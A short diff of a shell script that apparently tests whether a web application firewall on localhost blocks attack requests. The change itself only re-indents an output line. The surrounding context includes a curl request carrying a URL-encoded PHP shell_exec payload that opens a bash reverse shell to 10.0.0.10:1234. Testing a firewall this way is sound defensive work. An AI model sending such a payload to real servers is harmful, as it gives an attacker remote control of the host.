@@ -34,7 +34,7 @@ else
 	echo "[!] Path Traversal - Our WAF did NOT block all requests :("; 
 	exit 22; 
 fi
-echo "[x] Our WAF blocked all Path Traversal requests, Noice!"
+echo "    [x] Our WAF blocked all Path Traversal requests, Noice!"
 echo "    [ ] Shell Exec"
 shell_exec_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -m 10 -o /dev/null)
 if (($shell_exec_http_code == 403)); then 
